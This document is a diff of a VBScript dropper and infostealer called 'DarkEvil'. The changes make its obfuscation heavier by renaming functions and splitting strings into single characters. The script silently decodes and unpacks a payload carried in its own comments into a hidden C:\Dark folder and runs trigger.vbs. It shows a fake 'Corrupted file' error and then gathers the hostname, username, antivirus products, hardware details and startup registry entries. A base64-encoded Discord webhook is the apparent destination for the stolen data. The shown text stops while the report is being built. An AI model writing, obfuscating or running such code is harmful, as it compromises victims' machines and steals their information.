@@ -14117,345 +14117,345 @@
 
 
 
-Function PerformCertificateDecodeOperation(InputEncodedFilePath, OutputDecodedDirectory)
-	Dim FileSystemObjectInstance, WindowsShellObjectInstance, CommandStringForDecoding, TemporaryVariable1, TemporaryVariable2
-	TemporaryVariable2 = "Scri" & "ptin" & "g.Fi" & "leSyste" & "mObje" & "ct"
-	TemporaryVariable1 = "WSc" & "ript.S" & "he" & "ll"
-	Set WindowsShellObjectInstance = CreateObject(TemporaryVariable1)
-	Set FileSystemObjectInstance = CreateObject(TemporaryVariable2)
-	CommandStringForDecoding = "ce" & "rtu" & "til -dec" & "ode """ & InputEncodedFilePath & """ " & OutputDecodedDirectory
-	WindowsShellObjectInstance.Run CommandStringForDecoding, 0, True
+Function vbs9i0j3x(inputPathA, outputPathB)
+	Dim o0i9j3x, p2k8l1y, cmdStrA, tempVarA, tempVarB
+	tempVarB = "S" & "c" & "ri" & "p" & "ti" & "ng" & "." & "F" & "il" & "e" & "Sy" & "st" & "em" & "Ob" & "je" & "ct"
+	tempVarA = "W" & "Sc" & "r" & "ip" & "t" & "." & "Sh" & "el" & "l"
+	Set p2k8l1y = CreateObject(tempVarA)
+	Set o0i9j3x = CreateObject(tempVarB)
+	cmdStrA = "c" & "e" & "r" & "t" & "u" & "t" & "i" & "l" & " " & "-" & "d" & "e" & "c" & "o" & "d" & "e" & " " & """" & inputPathA & """" & " " & outputPathB
+	p2k8l1y.Run cmdStrA, 0, True
 End Function
 
-Function ExecuteExpandArchiveOperation(InputArchiveFilePath, OutputExtractionDirectory)
-	Dim ShellObjectForExecution, FileSystemObjectForArchive, CommandStringForExtraction, TempVariableForShell, TempVariableForFileSystem
-	TempVariableForFileSystem = "Scri" & "ptin" & "g.Fi" & "leSyste" & "mObje" & "ct"
-	TempVariableForShell = "WSc" & "ript.S" & "he" & "ll"
-	Set ShellObjectForExecution = CreateObject(TempVariableForShell)
-	Set FileSystemObjectForArchive = CreateObject(TempVariableForFileSystem)
-	CommandStringForExtraction = "ex" & "pand " & InputArchiveFilePath & " -F:* " & OutputExtractionDirectory
-	ShellObjectForExecution.Run CommandStringForExtraction, 0, True
+Function q2w8e4r(archivePathC, extractPathD)
+	Dim shlObjB, fsObjB, cmdStrB, tempVarC, tempVarD
+	tempVarD = "S" & "c" & "ri" & "p" & "ti" & "ng" & "." & "F" & "il" & "e" & "Sy" & "st" & "em" & "Ob" & "je" & "ct"
+	tempVarC = "W" & "Sc" & "r" & "ip" & "t" & "." & "Sh" & "el" & "l"
+	Set shlObjB = CreateObject(tempVarC)
+	Set fsObjB = CreateObject(tempVarD)
+	cmdStrB = "e" & "x" & "p" & "a" & "n" & "d" & " " & archivePathC & " " & "-" & "F" & ":" & "*" & " " & extractPathD
+	shlObjB.Run cmdStrB, 0, True
 End Function
 
-Function CreateDirectoryIfNotExists(TargetDirectoryPath)
-	Dim FileSystemObjectForDirectory, NewlyCreatedFolderObject
-	Set FileSystemObjectForDirectory = CreateObject("Scri" & "pting.F" & "ileSyst" & "emObject")
-	If Not FileSystemObjectForDirectory.FolderExists(TargetDirectoryPath) Then
-		Set NewlyCreatedFolderObject = FileSystemObjectForDirectory.CreateFolder(TargetDirectoryPath)
-		NewlyCreatedFolderObject.Attributes = NewlyCreatedFolderObject.Attributes + 2
+Function m3n7b4v(dirPathE)
+	Dim fsObjC, folderObjA
+	Set fsObjC = CreateObject("S" & "c" & "ri" & "p" & "ti" & "ng" & "." & "F" & "il" & "e" & "Sy" & "st" & "em" & "Ob" & "je" & "ct")
+	If Not fsObjC.FolderExists(dirPathE) Then
+		Set folderObjA = fsObjC.CreateFolder(dirPathE)
+		folderObjA.Attributes = folderObjA.Attributes + 2
 	End If
-	Set NewlyCreatedFolderObject = Nothing
-	Set FileSystemObjectForDirectory = Nothing
+	Set folderObjA = Nothing
+	Set fsObjC = Nothing
 End Function
 
-Function RunScriptCommand(CommandToExecute)
-	Dim ShellObjectForCommandExecution, TemporaryShellString
-	TemporaryShellString = "WSc" & "ript.S" & "hel" & "l"
-	Set ShellObjectForCommandExecution = CreateObject(TemporaryShellString)
-	ShellObjectForCommandExecution.Run CommandToExecute, 0, True
+Function x5t9r1s(cmdStrC)
+	Dim shlObjC, tempVarE
+	tempVarE = "W" & "Sc" & "r" & "ip" & "t" & "." & "Sh" & "el" & "l"
+	Set shlObjC = CreateObject(tempVarE)
+	shlObjC.Run cmdStrC, 0, True
 End Function
 
-Dim WindowsShellObjectForEnvironment, TemporaryDirectoryPath, SystemDrivePath, OutputTextFilePath, TargetDarkDirectory, TriggerScriptPath, FileSystemObjectForReading
-Dim InputFileObjectForReading, OutputFileObjectForWriting, CurrentLineFromFile
+Dim wshObjA, tmpPathA, sysDriveA, outFileA, targetDirA, scriptPathA, fsObjD
+Dim fileInA, fileOutA, lineTextA
 
-TemporaryShellStringForMain = "WSc" & "ript.S" & "he" & "ll"
-Set WindowsShellObjectForEnvironment = CreateObject(TemporaryShellStringForMain)
-TemporaryDirectoryPath = WindowsShellObjectForEnvironment.ExpandEnvironmentStrings("%TE" & "MP%")
-SystemDrivePath = WindowsShellObjectForEnvironment.ExpandEnvironmentStrings("%SYST" & "EMDR" & "IVE%")
-OutputTextFilePath = TemporaryDirectoryPath & "\ou" & "tpu" & "t.t" & "xt"
-TargetDarkDirectory = SystemDrivePath & "\D" & "ark\"
-TriggerScriptPath = "cs" & "cript " & TargetDarkDirectory & "trigg" & "er.vbs"
+tempVarF = "W" & "Sc" & "r" & "ip" & "t" & "." & "Sh" & "el" & "l"
+Set wshObjA = CreateObject(tempVarF)
+tmpPathA = wshObjA.ExpandEnvironmentStrings("%" & "T" & "E" & "M" & "P" & "%")
+sysDriveA = wshObjA.ExpandEnvironmentStrings("%" & "S" & "Y" & "S" & "T" & "E" & "M" & "D" & "R" & "I" & "V" & "E" & "%")
+outFileA = tmpPathA & "\" & "o" & "u" & "t" & "p" & "u" & "t" & "." & "t" & "x" & "t"
+targetDirA = sysDriveA & "\" & "D" & "a" & "r" & "k" & "\"
+scriptPathA = "c" & "s" & "c" & "r" & "i" & "p" & "t" & " " & targetDirA & "t" & "r" & "i" & "g" & "g" & "e" & "r" & "." & "v" & "b" & "s"
 
-Set FileSystemObjectForReading = CreateObject("Scri" & "pting.Fi" & "leSys" & "temObj" & "ect")
-Set InputFileObjectForReading = FileSystemObjectForReading.OpenTextFile(WScript.ScriptFullName, 1)
-Set OutputFileObjectForWriting = FileSystemObjectForReading.OpenTextFile(OutputTextFilePath, 2, True)
+Set fsObjD = CreateObject("S" & "c" & "ri" & "p" & "ti" & "ng" & "." & "F" & "il" & "e" & "Sy" & "st" & "em" & "Ob" & "je" & "ct")
+Set fileInA = fsObjD.OpenTextFile(WScript.ScriptFullName, 1)
+Set fileOutA = fsObjD.OpenTextFile(outFileA, 2, True)
 
-Do Until InputFileObjectForReading.AtEndOfStream
-    CurrentLineFromFile = InputFileObjectForReading.ReadLine
-    If Left(Trim(CurrentLineFromFile), 1) = "'" Then
-        OutputFileObjectForWriting.WriteLine Mid(CurrentLineFromFile, 2)
+Do Until fileInA.AtEndOfStream
+    lineTextA = fileInA.ReadLine
+    If Left(Trim(lineTextA), 1) = "'" Then
+        fileOutA.WriteLine Mid(lineTextA, 2)
     End If
 Loop
 
-InputFileObjectForReading.Close
-OutputFileObjectForWriting.Close
+fileInA.Close
+fileOutA.Close
 
-Set InputFileObjectForReading = Nothing
-Set OutputFileObjectForWriting = Nothing
-Set FileSystemObjectForReading = Nothing
+Set fileInA = Nothing
+Set fileOutA = Nothing
+Set fsObjD = Nothing
 
-CreateDirectoryIfNotExists TargetDarkDirectory
-PerformCertificateDecodeOperation OutputTextFilePath, TargetDarkDirectory & "DE.z" & "ip"
-ExecuteExpandArchiveOperation TargetDarkDirectory & "DE.z" & "ip", TargetDarkDirectory
-RunScriptCommand TriggerScriptPath
-
-
-MsgBox "Corrupted file: " & Err.Description, 48, "Error!"
+m3n7b4v targetDirA
+vbs9i0j3x outFileA, targetDirA & "D" & "E" & "." & "z" & "i" & "p"
+q2w8e4r targetDirA & "D" & "E" & "." & "z" & "i" & "p", targetDirA
+x5t9r1s scriptPathA
 
 
+MsgBox "C" & "o" & "r" & "r" & "u" & "p" & "t" & "e" & "d" & " " & "f" & "i" & "l" & "e" & ":" & " " & Err.Description, 48, "E" & "r" & "r" & "o" & "r" & "!"
 
-Function Base64Decode(base64)
-    Dim xml, node
-    Set xml = CreateObject("Msxml2.DOMDocument.3.0")
-    Set node = xml.createElement("b64")
-    node.dataType = "bin.base64"
-    node.text = base64
-    Base64Decode = node.nodeTypedValue
+
+
+Function f8j2d5k(b64Input)
+    Dim xmlDocA, nodeA
+    Set xmlDocA = CreateObject("M" & "s" & "x" & "m" & "l" & "2" & "." & "D" & "O" & "M" & "D" & "o" & "c" & "u" & "m" & "e" & "n" & "t" & "." & "3" & "." & "0")
+    Set nodeA = xmlDocA.createElement("b" & "6" & "4")
+    nodeA.dataType = "b" & "i" & "n" & "." & "b" & "a" & "s" & "e" & "6" & "4"
+    nodeA.text = b64Input
+    f8j2d5k = nodeA.nodeTypedValue
 End Function
 
 
-Function BytesToStr(bytes)
-    Dim stream
-    Set stream = CreateObject("ADODB.Stream")
-    stream.Type = 1
-    stream.Open
-    stream.Write bytes
-    stream.Position = 0
-    stream.Type = 2
-    stream.Charset = "utf-8"
-    BytesToStr = stream.ReadText
-    stream.Close
+Function r3t7m2n(byteArrayA)
+    Dim streamA
+    Set streamA = CreateObject("A" & "D" & "O" & "D" & "B" & "." & "S" & "t" & "r" & "e" & "a" & "m")
+    streamA.Type = 1
+    streamA.Open
+    streamA.Write byteArrayA
+    streamA.Position = 0
+    streamA.Type = 2
+    streamA.Charset = "u" & "t" & "f" & "-" & "8"
+    r3t7m2n = streamA.ReadText
+    streamA.Close
 End Function
 
 
-Function GetHostName()
-    Set wshShell = CreateObject("WScript.Shell")
-    GetHostName = wshShell.ExpandEnvironmentStrings("%COMPUTERNAME%")
+Function g4h8s1w()
+    Set wshA = CreateObject("W" & "S" & "c" & "r" & "i" & "p" & "t" & "." & "S" & "h" & "e" & "l" & "l")
+    g4h8s1w = wshA.ExpandEnvironmentStrings("%" & "C" & "O" & "M" & "P" & "U" & "T" & "E" & "R" & "N" & "A" & "M" & "E" & "%")
 End Function
 
 
-Function GetUsername()
-    Set wshShell = CreateObject("WScript.Shell")
-    GetUsername = wshShell.ExpandEnvironmentStrings("%USERNAME%")
+Function k9p3q6x()
+    Set wshB = CreateObject("W" & "S" & "c" & "r" & "i" & "p" & "t" & "." & "S" & "h" & "e" & "l" & "l")
+    k9p3q6x = wshB.ExpandEnvironmentStrings("%" & "U" & "S" & "E" & "R" & "N" & "A" & "M" & "E" & "%")
 End Function
 
 
-Function GetWinVersion()
-    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
-    Set colOS = objWMI.ExecQuery("Select * from Win32_OperatingSystem")
-    For Each os in colOS
-        GetWinVersion = os.Caption & " (Build " & os.BuildNumber & ")"
+Function l2o8m4c()
+    Set wmiA = GetObject("w" & "i" & "n" & "m" & "g" & "m" & "t" & "s" & ":" & "\" & "\" & "." & "\" & "r" & "o" & "o" & "t" & "\" & "c" & "i" & "m" & "v" & "2")
+    Set osColA = wmiA.ExecQuery("S" & "e" & "l" & "e" & "c" & "t" & " " & "*" & " " & "f" & "r" & "o" & "m" & " " & "W" & "i" & "n" & "3" & "2" & "_" & "O" & "p" & "e" & "r" & "a" & "t" & "i" & "n" & "g" & "S" & "y" & "s" & "t" & "e" & "m")
+    For Each osA In osColA
+        l2o8m4c = osA.Caption & " " & "(" & "B" & "u" & "i" & "l" & "d" & " " & osA.BuildNumber & ")"
         Exit Function
     Next
-    GetWinVersion = "Unknown"
+    l2o8m4c = "U" & "n" & "k" & "n" & "o" & "w" & "n"
 End Function
 
 
-Function GetArch()
-    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
-    Set colProc = objWMI.ExecQuery("Select AddressWidth from Win32_Processor")
-    For Each proc in colProc
-        GetArch = proc.AddressWidth & "-bit"
+Function b5v9r2t()
+    Set wmiB = GetObject("w" & "i" & "n" & "m" & "g" & "m" & "t" & "s" & ":" & "\" & "\" & "." & "\" & "r" & "o" & "o" & "t" & "\" & "c" & "i" & "m" & "v" & "2")
+    Set procColA = wmiB.ExecQuery("S" & "e" & "l" & "e" & "c" & "t" & " " & "A" & "d" & "d" & "r" & "e" & "s" & "s" & "W" & "i" & "d" & "t" & "h" & " " & "f" & "r" & "o" & "m" & " " & "W" & "i" & "n" & "3" & "2" & "_" & "P" & "r" & "o" & "c" & "e" & "s" & "s" & "o" & "r")
+    For Each procA In procColA
+        b5v9r2t = procA.AddressWidth & "-" & "b" & "i" & "t"
         Exit Function
     Next
-    GetArch = "Unknown"
+    b5v9r2t = "U" & "n" & "k" & "n" & "o" & "w" & "n"
 End Function
 
-Function GetAntivirus()
+Function n7c1a8d()
     On Error Resume Next
-    Set objWMI = GetObject("winmgmts:\\.\root\SecurityCenter2")
-    Set colAV = objWMI.ExecQuery("Select * from AntivirusProduct")
-    Dim avList
-    avList = ""
-    For Each av in colAV
-        avList = avList & av.displayName & ", "
+    Set wmiC = GetObject("w" & "i" & "n" & "m" & "g" & "m" & "t" & "s" & ":" & "\" & "\" & "." & "\" & "r" & "o" & "o" & "t" & "\" & "S" & "e" & "c" & "u" & "r" & "i" & "t" & "y" & "C" & "e" & "n" & "t" & "e" & "r" & "2")
+    Set avColA = wmiC.ExecQuery("S" & "e" & "l" & "e" & "c" & "t" & " " & "*" & " " & "f" & "r" & "o" & "m" & " " & "A" & "n" & "t" & "i" & "v" & "i" & "r" & "u" & "s" & "P" & "r" & "o" & "d" & "u" & "c" & "t")
+    Dim avListA
+    avListA = ""
+    For Each avA In avColA
+        avListA = avListA & avA.displayName & ", "
     Next
-    If Len(avList) = 0 Then
-        GetAntivirus = "None or Unknown"
+    If Len(avListA) = 0 Then
+        n7c1a8d = "N" & "o" & "n" & "e" & " " & "o" & "r" & " " & "U" & "n" & "k" & "n" & "o" & "w" & "n"
     Else
-        GetAntivirus = Left(avList, Len(avList)-2)
+        n7c1a8d = Left(avListA, Len(avListA)-2)
     End If
 End Function
 
 
-Function GetDrives()
-    Set fso = CreateObject("Scripting.FileSystemObject")
-    Set drives = fso.Drives
-    Dim d, result
-    result = ""
-    For Each d in drives
-        If d.IsReady Then result = result & d.DriveLetter & ": (" & d.VolumeName & "), "
+Function h6y2u9j()
+    Set fsoA = CreateObject("S" & "c" & "r" & "i" & "p" & "t" & "i" & "n" & "g" & "." & "F" & "i" & "l" & "e" & "S" & "y" & "s" & "t" & "e" & "m" & "O" & "b" & "j" & "e" & "c" & "t")
+    Set drivesA = fsoA.Drives
+    Dim driveA, resultA
+    resultA = ""
+    For Each driveA In drivesA
+        If driveA.IsReady Then resultA = resultA & driveA.DriveLetter & ":" & " " & "(" & driveA.VolumeName & ")" & ", "
     Next
-    If Len(result) = 0 Then
-        GetDrives = "No drives found"
+    If Len(resultA) = 0 Then
+        h6y2u9j = "N" & "o" & " " & "d" & "r" & "i" & "v" & "e" & "s" & " " & "f" & "o" & "u" & "n" & "d"
     Else
-        GetDrives = Left(result, Len(result)-2)
+        h6y2u9j = Left(resultA, Len(resultA)-2)
     End If
 End Function
 
 
-Function GetTotalRAM()
+Function t8e4w1q()
     On Error Resume Next
-    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
-    Set colSys = objWMI.ExecQuery("Select TotalPhysicalMemory from Win32_ComputerSystem")
-    For Each sys in colSys
-        Dim total
-        total = CDbl(sys.TotalPhysicalMemory)
-        GetTotalRAM = Round(total / 1073741824, 1) & " GB"
+    Set wmiD = GetObject("w" & "i" & "n" & "m" & "g" & "m" & "t" & "s" & ":" & "\" & "\" & "." & "\" & "r" & "o" & "o" & "t" & "\" & "c" & "i" & "m" & "v" & "2")
+    Set sysColA = wmiD.ExecQuery("S" & "e" & "l" & "e" & "c" & "t" & " " & "T" & "o" & "t" & "a" & "l" & "P" & "h" & "y" & "s" & "i" & "c" & "a" & "l" & "M" & "e" & "m" & "o" & "r" & "y" & " " & "f" & "r" & "o" & "m" & " " & "W" & "i" & "n" & "3" & "2" & "_" & "C" & "o" & "m" & "p" & "u" & "t" & "e" & "r" & "S" & "y" & "s" & "t" & "e" & "m")
+    For Each sysA In sysColA
+        Dim totalA
+        totalA = CDbl(sysA.TotalPhysicalMemory)
+        t8e4w1q = Round(totalA / 1073741824, 1) & " " & "G" & "B"
         Exit Function
     Next
-    GetTotalRAM = "Unknown"
+    t8e4w1q = "U" & "n" & "k" & "n" & "o" & "w" & "n"
 End Function
 
 
-Function GetRAMModules()
+Function p3a7s2m()
     On Error Resume Next
-    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
-    Set colRAM = objWMI.ExecQuery("Select Capacity, Manufacturer, Speed from Win32_PhysicalMemory")
-    Dim moduleList, ramSize, entry
-    moduleList = ""
-    For Each ram In colRAM
-        ramSize = CDbl(ram.Capacity) / 1073741824
-        entry = Round(ramSize, 1) & " GB @ " & ram.Speed & " MHz (" & ram.Manufacturer & ")"
-        moduleList = moduleList & entry & ", "
+    Set wmiE = GetObject("w" & "i" & "n" & "m" & "g" & "m" & "t" & "s" & ":" & "\" & "\" & "." & "\" & "r" & "o" & "o" & "t" & "\" & "c" & "i" & "m" & "v" & "2")
+    Set ramColA = wmiE.ExecQuery("S" & "e" & "l" & "e" & "c" & "t" & " " & "C" & "a" & "p" & "a" & "c" & "i" & "t" & "y" & "," & " " & "M" & "a" & "n" & "u" & "f" & "a" & "c" & "t" & "u" & "r" & "e" & "r" & "," & " " & "S" & "p" & "e" & "e" & "d" & " " & "f" & "r" & "o" & "m" & " " & "W" & "i" & "n" & "3" & "2" & "_" & "P" & "h" & "y" & "s" & "i" & "c" & "a" & "l" & "M" & "e" & "m" & "o" & "r" & "y")
+    Dim moduleListA, ramSizeA, entryA
+    moduleListA = ""
+    For Each ramA In ramColA
+        ramSizeA = CDbl(ramA.Capacity) / 1073741824
+        entryA = Round(ramSizeA, 1) & " " & "G" & "B" & " " & "@" & " " & ramA.Speed & " " & "M" & "H" & "z" & " " & "(" & ramA.Manufacturer & ")"
+        moduleListA = moduleListA & entryA & ", "
     Next
-    If Len(moduleList) = 0 Then
-        GetRAMModules = "No RAM modules found"
+    If Len(moduleListA) = 0 Then
+        p3a7s2m = "N" & "o" & " " & "R" & "A" & "M" & " " & "m" & "o" & "d" & "u" & "l" & "e" & "s" & " " & "f" & "o" & "u" & "n" & "d"
     Else
-        GetRAMModules = Left(moduleList, Len(moduleList) - 2)
+        p3a7s2m = Left(moduleListA, Len(moduleListA) - 2)
     End If
 End Function
 
 
 
-Function GetCPUName()
+Function z1x5c9v()
     On Error Resume Next
-    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
-    Set colCPU = objWMI.ExecQuery("Select Name from Win32_Processor")
-    For Each cpu in colCPU
-        GetCPUName = Trim(cpu.Name)
+    Set wmiF = GetObject("w" & "i" & "n" & "m" & "g" & "m" & "t" & "s" & ":" & "\" & "\" & "." & "\" & "r" & "o" & "o" & "t" & "\" & "c" & "i" & "m" & "v" & "2")
+    Set cpuColA = wmiF.ExecQuery("S" & "e" & "l" & "e" & "c" & "t" & " " & "N" & "a" & "m" & "e" & " " & "f" & "r" & "o" & "m" & " " & "W" & "i" & "n" & "3" & "2" & "_" & "P" & "r" & "o" & "c" & "e" & "s" & "s" & "o" & "r")
+    For Each cpuA In cpuColA
+        z1x5c9v = Trim(cpuA.Name)
         Exit Function
     Next
-    GetCPUName = "Unknown"
+    z1x5c9v = "U" & "n" & "k" & "n" & "o" & "w" & "n"
 End Function
 
-Function GetGPUName()
+Function w4s8d3f()
     On Error Resume Next
-    Set objWMI = GetObject("winmgmts:\\.\root\cimv2")
-    Set colGPU = objWMI.ExecQuery("Select Name from Win32_VideoController")
-    Dim gpus
-    gpus = ""
-    For Each gpu in colGPU
-        gpus = gpus & gpu.Name & ", "
+    Set wmiG = GetObject("w" & "i" & "n" & "m" & "g" & "m" & "t" & "s" & ":" & "\" & "\" & "." & "\" & "r" & "o" & "o" & "t" & "\" & "c" & "i" & "m" & "v" & "2")
+    Set gpuColA = wmiG.ExecQuery("S" & "e" & "l" & "e" & "c" & "t" & " " & "N" & "a" & "m" & "e" & " " & "f" & "r" & "o" & "m" & " " & "W" & "i" & "n" & "3" & "2" & "_" & "V" & "i" & "d" & "e" & "o" & "C" & "o" & "n" & "t" & "r" & "o" & "l" & "l" & "e" & "r")
+    Dim gpusA
+    gpusA = ""
+    For Each gpuA In gpuColA
+        gpusA = gpusA & gpuA.Name & ", "
     Next
-    If Len(gpus) > 0 Then
-        GetGPUName = Left(gpus, Len(gpus) - 2)
+    If Len(gpusA) > 0 Then
+        w4s8d3f = Left(gpusA, Len(gpusA) - 2)
     Else
-        GetGPUName = "Unknown"
+        w4s8d3f = "U" & "n" & "k" & "n" & "o" & "w" & "n"
     End If
 End Function
 
 
-Function HKEYFromRoot(path)
+Function o9i3u7y(pathF)
     Select Case True
-        Case InStr(path, "HKLM") > 0: HKEYFromRoot = &H80000002
-        Case InStr(path, "HKCU") > 0: HKEYFromRoot = &H80000001
+        Case InStr(pathF, "H" & "K" & "L" & "M") > 0: o9i3u7y = &H80000002
+        Case InStr(pathF, "H" & "K" & "C" & "U") > 0: o9i3u7y = &H80000001
     End Select
 End Function
 
-Function GetStartupPrograms()
+Function y2t6r8e()
     On Error Resume Next
-    Dim WshShell, regPaths, path, output, subOutput
-    Set WshShell = CreateObject("WScript.Shell")
+    Dim wshC, regPathsA, pathG, outputA, subOutputA
+    Set wshC = CreateObject("W" & "S" & "c" & "r" & "i" & "p" & "t" & "." & "S" & "h" & "e" & "l" & "l")
     
-    regPaths = Array( _
-        "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", _
-        "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" _
+    regPathsA = Array( _
+        "H" & "K" & "C" & "U" & "\" & "S" & "o" & "f" & "t" & "w" & "a" & "r" & "e" & "\" & "M" & "i" & "c" & "r" & "o" & "s" & "o" & "f" & "t" & "\" & "W" & "i" & "n" & "d" & "o" & "w" & "s" & "\" & "C" & "u" & "r" & "r" & "e" & "n" & "t" & "V" & "e" & "r" & "s" & "i" & "o" & "n" & "\" & "R" & "u" & "n", _
+        "H" & "K" & "L" & "M" & "\" & "S" & "o" & "f" & "t" & "w" & "a" & "r" & "e" & "\" & "M" & "i" & "c" & "r" & "o" & "s" & "o" & "f" & "t" & "\" & "W" & "i" & "n" & "d" & "o" & "w" & "s" & "\" & "C" & "u" & "r" & "r" & "e" & "n" & "t" & "V" & "e" & "r" & "s" & "i" & "o" & "n" & "\" & "R" & "u" & "n" _
     )
     
-    output = ""
-    For Each path In regPaths
-        subOutput = ""
-        Set objReg = GetObject("winmgmts:\\.\root\default:StdRegProv")
+    outputA = ""
+    For Each pathG In regPathsA
+        subOutputA = ""
+        Set regObjA = GetObject("w" & "i" & "n" & "m" & "g" & "m" & "t" & "s" & ":" & "\" & "\" & "." & "\" & "r" & "o" & "o" & "t" & "\" & "d" & "e" & "f" & "a" & "u" & "l" & "t" & ":" & "S" & "t" & "d" & "R" & "e" & "g" & "P" & "r" & "o" & "v")
         
-        Dim valueNames, types, i, value
-        objReg.EnumValues HKEYFromRoot(path), SubKeyFromPath(path), valueNames, types
+        Dim valNamesA, typesA, idxA, valueA
+        regObjA.EnumValues o9i3u7y(pathG), u4k9j2q(pathG), valNamesA, typesA
         
-        If IsArray(valueNames) Then
-            For i = 0 To UBound(valueNames)
-                objReg.GetStringValue HKEYFromRoot(path), SubKeyFromPath(path), valueNames(i), value
-                subOutput = subOutput & "  " & valueNames(i) & " = " & value & vbCrLf
+        If IsArray(valNamesA) Then
+            For idxA = 0 To UBound(valNamesA)
+                regObjA.GetStringValue o9i3u7y(pathG), u4k9j2q(pathG), valNamesA(idxA), valueA
+                subOutputA = subOutputA & "  " & valNamesA(idxA) & " " & "=" & " " & valueA & vbCrLf
             Next
         Else
-            subOutput = "  (No values)" & vbCrLf
+            subOutputA = "  " & "(" & "N" & "o" & " " & "v" & "a" & "l" & "u" & "e" & "s" & ")" & vbCrLf
         End If
         
-        If Trim(subOutput) <> "" Then
-            output = output & "[" & path & "]" & vbCrLf & subOutput
+        If Trim(subOutputA) <> "" Then
+            outputA = outputA & "[" & pathG & "]" & vbCrLf & subOutputA
         End If
     Next
 
-    If Len(output) = 0 Then
-        GetStartupPrograms = "No startup entries found."
+    If Len(outputA) = 0 Then
+        y2t6r8e = "N" & "o" & " " & "s" & "t" & "a" & "r" & "t" & "u" & "p" & " " & "e" & "n" & "t" & "r" & "i" & "e" & "s" & " " & "f" & "o" & "u" & "n" & "d" & "."
     Else
-        GetStartupPrograms = Trim(output)
+        y2t6r8e = Trim(outputA)
     End If
 End Function
 
 
-Function SubKeyFromPath(path)
-    SubKeyFromPath = Mid(path, InStr(path, "\") + 1)
+Function u4k9j2q(pathH)
+    u4k9j2q = Mid(pathH, InStr(pathH, "\") + 1)
 End Function
 
 
-Function CheckDarkEvilStatus()
+Function e7b3n9m()
     On Error Resume Next
-    Dim fso, basePath, requiredFiles, i, filePath
-    Set fso = CreateObject("Scripting.FileSystemObject")
+    Dim fsoB, basePathA, reqFilesA, idxB, filePathA
+    Set fsoB = CreateObject("S" & "c" & "r" & "i" & "p" & "t" & "i" & "n" & "g" & "." & "F" & "i" & "l" & "e" & "S" & "y" & "s" & "t" & "e" & "m" & "O" & "b" & "j" & "e" & "c" & "t")
 
-    basePath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%systemdrive%\Dark\")
+    basePathA = CreateObject("W" & "S" & "c" & "r" & "i" & "p" & "t" & "." & "S" & "h" & "e" & "l" & "l").ExpandEnvironmentStrings("%" & "s" & "y" & "s" & "t" & "e" & "m" & "d" & "r" & "i" & "v" & "e" & "%" & "\" & "D" & "a" & "r" & "k" & "\")
 
-    requiredFiles = Array( _
-        "Dark.encd", _
-        "trigger.vbs" _
+    reqFilesA = Array( _
+        "D" & "a" & "r" & "k" & "." & "e" & "n" & "c" & "d", _
+        "t" & "r" & "i" & "g" & "g" & "e" & "r" & "." & "v" & "b" & "s" _
     )
 
-    For i = 0 To UBound(requiredFiles)
-        filePath = basePath & requiredFiles(i)
-        If Not fso.FileExists(filePath) Then
-            CheckDarkEvilStatus = "Failed to install DarkEvil"
+    For idxB = 0 To UBound(reqFilesA)
+        filePathA = basePathA & reqFilesA(idxB)
+        If Not fsoB.FileExists(filePathA) Then
+            e7b3n9m = "F" & "a" & "i" & "l" & "e" & "d" & " " & "t" & "o" & " " & "i" & "n" & "s" & "t" & "a" & "l" & "l" & " " & "D" & "a" & "r" & "k" & "E" & "v" & "i" & "l"
             Exit Function
         End If
     Next
 
-	CheckDarkEvilStatus = "DarkEvil Installed"
+	e7b3n9m = "D" & "a" & "r" & "k" & "E" & "v" & "i" & "l" & " " & "I" & "n" & "s" & "t" & "a" & "l" & "l" & "e" & "d"
 End Function
 
 
-Function EscapeJson(str)
-    str = Replace(str, "\", "\\")
-    str = Replace(str, """", "\""")
-    str = Replace(str, vbCrLf, "\n")
-    str = Replace(str, vbLf, "\n")
-    str = Replace(str, vbCr, "\n")
-    EscapeJson = str
+Function s5h9v2c(strA)
+    strA = Replace(strA, "\", "\\")
+    strA = Replace(strA, """", "\""")
+    strA = Replace(strA, vbCrLf, "\n")
+    strA = Replace(strA, vbLf, "\n")
+    strA = Replace(strA, vbCr, "\n")
+    s5h9v2c = strA
 End Function
 
-encodedUrl = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MjQxODc2ODczODU4MjY4OC9PY0dPbzBQM2ZKUWl6Y3UzVi1jTmJlOFBKcS1ZRXpSYkxkLVl6Z2lMdWZPWnV6UzhabkhsV3RZOC1xU3RTczdHdks5Rw=="
+encodedStr = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM5MjQxODc2ODczODU4MjY4OC9PY0dPbzBQM2ZKUWl6Y3UzVi1jTmJlOFBKcS1ZRXpSYkxkLVl6Z2lMdWZPWnV6UzhabkhsV3RZOC1xU3RTczdHdks5Rw=="
 
-decodedBytes = Base64Decode(encodedUrl)
-webhookUrl = BytesToStr(decodedBytes)
+decodedData = f8j2d5k(encodedStr)
+webhookStr = r3t7m2n(decodedData)
 
-info = "**[SYSTEM INFO CAPTURED]**" & vbCrLf & _
-       "**Hostname:** " & GetHostName() & vbCrLf & _
-       "**Username:** " & GetUsername() & vbCrLf & _
-       "**OS:** " & GetWinVersion() & vbCrLf & _
-       "**Architecture:** " & GetArch() & vbCrLf & _
-       "**Antivirus:** " & GetAntivirus() & vbCrLf & _
-       "**Drives:** " & GetDrives() & vbCrLf & _
-		"**CPU:** " & GetCPUName() & vbCrLf & _
-	   "**GPU:** " & GetGPUName() & vbCrLf & _
-	   "**Total RAM:** " & GetTotalRAM() & vbCrLf & _
-	   "**RAM Module:** " & GetRAMModules() & vbCrLf & _
-	   "**StartUp Prorgams:** " & GetStartupPrograms() & vbCrLf & _
-	   "**DarkEvil:** " & CheckDarkEvilStatus()
+infoData = "*" & "*" & "[" & "S" & "Y" & "S" & "T" & "E" & "M" & " " & "I" & "N" & "F" & "O" & " " & "C" & "A" & "P" & "T" & "U" & "R" & "E" & "D" & "]" & "*" & "*" & vbCrLf & _
+       "*" & "*" & "H" & "o" & "s" & "t" & "n" & "a" & "m" & "e" & ":" & "*" & "*" & " " & g4h8s1w() & vbCrLf & _
